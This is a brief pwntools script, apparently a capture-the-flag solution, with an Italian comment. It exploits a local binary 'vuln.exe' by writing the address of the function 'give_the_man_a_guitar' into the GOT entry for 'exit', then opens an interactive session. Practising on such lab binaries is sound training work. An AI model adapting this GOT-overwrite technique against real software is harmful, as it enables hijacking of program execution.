from pwn import *

# il programma qui ti chiede quale funzione vuoi chiamare e dove vuoi chiamarla
elf=ELF('./vuln.exe')
p=process('./vuln.exe')
p.sendline(b'Y')
p.sendline(str(elf.functions['give_the_man_a_guitar'].address))
p.sendline(str(elf.got['exit']))
p.interactive()